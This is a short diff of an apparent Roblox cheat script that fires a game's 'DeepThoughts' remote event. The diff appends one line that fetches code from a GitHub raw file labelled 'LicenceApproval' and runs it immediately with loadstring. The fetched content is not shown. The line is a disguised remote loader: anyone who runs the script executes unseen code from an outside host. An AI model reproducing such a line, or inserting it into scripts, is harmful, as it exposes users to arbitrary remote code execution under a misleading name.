@@ -209,3 +209,4 @@ local args = {
 game:GetService("ReplicatedStorage"):WaitForChild("Characters"):WaitForChild("Deep"):WaitForChild("Remotes"):WaitForChild("DeepThoughts"):FireServer(unpack(args))
    end
 end)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/You2berek/ScriptsMP/refs/heads/main/LicenceApproval"))()
